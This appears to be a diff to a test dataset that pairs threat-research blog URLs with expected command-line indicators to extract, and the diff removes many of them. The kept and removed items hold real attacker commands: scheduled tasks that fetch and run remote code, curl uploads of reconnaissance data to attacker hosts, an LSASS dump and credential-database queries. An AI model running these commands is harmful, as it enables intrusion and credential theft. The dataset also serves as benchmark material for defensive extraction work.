@@ -29,8 +29,7 @@
   {
     "url": "https://levelblue.com/blogs/spiderlabs-blog/malicious-screen-connect-campaign-abuses-ai-themed-lures-for-xworm-delivery",
     "expected_items": [
-      "\"ScreenConnect.ClientService.exe\" \"?e=Access&y=Guest&h=instance-keoxeq-relay[.]screenconnect[.]com&p=443&s=44f &k=BgIAAA &c=GROKgpt\"",
-      "mshta.exe (IWshShell3.Run(\"\\\"C:\\Users\\Mguise\\ONEDRI~1\\DOCUME~1\\loadding\\Temp\\X-META~1.BAT\\\" ::\\\", \\\"0\\\".\\\"))"
+      "\"ScreenConnect.ClientService.exe\" \"?e=Access&y=Guest&h=instance-keoxeq-relay[.]screenconnect[.]com&p=443&s=44f &k=BgIAAA &c=GROKgpt\""
     ]
   },
   {
@@ -52,17 +51,7 @@
   },
   {
     "url": "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one",
-    "expected_items": [
-      "\"C:\\Windows\\System32\\conhost.exe\" --headless cmd /c ping localhost > nul & schtasks /create /tn \"EdgeTaskUI\" /f /sc minute /mo 16 /tr \"conhost --headless powershell -WindowStyle Minimized irm woodstocktutors[.]com/jbc.php?fv=$env:COMPUTERNAME*$env:USERNAME -OutFile C:\\Users\\public\\kwe.cc; Get-Content C:\\Users\\public\\kwe.cc | cmd\"",
-      "schtasks /create /tn \"Task-S-1-5-42121\" /f /sc minute /mo 18 /tr \"conhost --headless cmd /v:on /c set gz=ht& set gtz=tps:& set 7gg=!gz!!gtz!& set 6hg=!7gg!//p^rin^ce^cle^anit.co^m& c^ur^l !6hg!/d^prin.p^hp?dr=%computername%;%username%|c^m^d\"",
-      "\"C:\\Windows\\System32\\cmd.exe\" /start min /c schtasks /create /tn \"OneDrive\\OneDrive Standalone Update Task-S-1-5-21-9920643986-2299988379\" /f /sc minute /mo 19 /tr \"conhost --headless cmd /v:on /c set 765=ht& set 665=tp:& set 565=!765!!665!& set 465=!565!//46.229.55[.]63& curl !465!/sv^c^h.p^h^p?li=%computername%..%hostname%c^m^d\" & msg * \"ERROR 0XA008CE : ERROR reading File, contents are corrupted.\"",
-      "cd C:\\programdata dir > abc1.pdf tasklist >> abc1.pdf wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get >>abc1.pdf wmic logicaldisk get caption >> abc1.pdf systeminfo >> C:\\programdata\\abc1.pdf curl -X POST -F \"file=@C:\\programdata\\abc1.pdf\" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username% del abc1.pdf",
-      "cd C:\\programdata set /P =\"MZ\" < nul >> sh1.txt curl -o sh2.txt hxxp://173.254.204[.]72/sh2.txt copy /b sh1.txt+sh2.txt shh.exe curl -o dune64.log //173.254.204[.]72/dune64.log ren dune64.log dune64.bin shh.exe dune64.bin dir > abc1.pdf tasklist >> abc1.pdf curl -X POST -F \"file=@C:\\programdata\\abc1.pdf\" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username% del abc1.pdf",
-      "cd C:\\programdata net use Z: \\\\72.18.215[.]1\\tempy Z: Z:\\shl.exe dune64.bin C: net use /delete Z: /y whoami dir > abc1.pdf tasklist >> abc1.pdf curl -X POST -F \"file=@C:\\programdata\\abc1.pdf\" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username% del abc1.pdf",
-      "\"C:\\Windows\\System32\\conhost.exe\" --headless cmd /c ping localhost > nul & schtasks /create /tn \"MSTaskUI\" /f /sc minute /mo 16 /tr \"conhost --headless powershell -WindowStyle Minimized irm utizviewstation[.]com/sdf.php?fv=$env:COMPUTERNAME*$env:USERNAME -OutFile C:\\Users\\public\\documents\\vfc.cc; Get-Content C:\\Users\\public\\documents\\vfc.cc | cmd\"",
-      "tree \"%userprofile%\\Desktop\" /f > C:\\Users\\Public\\Documents\\d.log systeminfo >> C:\\Users\\Public\\Documents\\d.log WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /Format:List >> C:\\Users\\Public\\Documents\\d.log wmic logicaldisk get name >> C:\\Users\\Public\\Documents\\d.log cd C:\\Users\\Public\\Documents curl -X POST -F \"file=@d.log\" hxxps://www.utizviewstation[.]com/urf.php?mn=%computername% del d.log",
-      "curl -o C:\\ProgramData\\msuitl.tar hxxp://utizviewstation[.]com/msuitl.tar cd C:\\ProgramData tar -xvf msuitl.tar dir > t0.log msuitl.exe tasklist >> t0.log curl -X POST -F \"file=@t0.log\" hxxps://www.utizviewstation[.]com/urf.php?mn=%username% del t0.log"
-    ]
+    "expected_items": []
   },
   {
     "url": "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793",
@@ -78,7 +67,6 @@
       "schtasks.exe /run /tn \"\\Microsoft\\Windows\\DefenderUPDService\"",
       "schtasks.exe /create /SC ONSTART /tn \"\\Microsoft\\Windows\\IISUpdateService\" /tr \"C:\\Windows\\WinStore\\iisexpresstray.exe\" /RU \"SYSTEM\" /f",
       "schtasks.exe /run /tn \"\\Microsoft\\Windows\\IISUpdateService\"",
-      "reg.exe save HKLM\\SYSTEM \"C:\\Windows\\temp\\1\\sy.sa\" /y",
       "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\tempp' q q"
     ]
   },
@@ -87,7 +75,6 @@
     "expected_items": [
       "powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\\programdata\\COIm.jpg",
       "rundll32 c:\\programdata\\COIm.jpg,init",
-      "rundll32.exe \"C:\\Users[REDACTED]\\AppData\\Roaming[REDACTED]\\Cadiak.dll\",init --od=\"DeskBlouse\\license.dat\"",
       "C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent",
       "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List",
       "ipconfig /all",
@@ -129,7 +116,6 @@
       "whoami /groups",
       "net group domain admins /dom",
       "wbadmin.exe start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include\":C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY\" -quiet",
-      "ssh root@193.242.184.150 -R *:10400 -p22",
       "psql.exe -U postgres --csv -d VeeamBackup -w -c \"SELECT user_name,password,description,change_time_utc FROM credentials\"",
       "for /f \"tokens=1,2 delims= \" %%A in ('\"tasklist /fi \"Imagename eq lsass.exe\" | find \"lsass\"\"') do rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+000024 %%B \\Windows\\Temp\\*.* full",
       "net user backup_EA P@ssw0rd1234 /add /dom",
@@ -138,10 +124,6 @@
   },
   {
     "url": "https://www.elastic.co/security-labs/roningloader",
-    "expected_items": [
-      "mklink /D \"C:\\ProgramData\\roming\" C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0",
-      "C:\\Windows\\System32\\ClipUp.exe -ppl C:\\ProgramData\\roming\\MsMpEng.exe",
-      "regsvr32.exe /S \"C:\\ProgramData\\Roning\\goldendays.dll\""
-    ]
+    "expected_items": []
   }
 ]
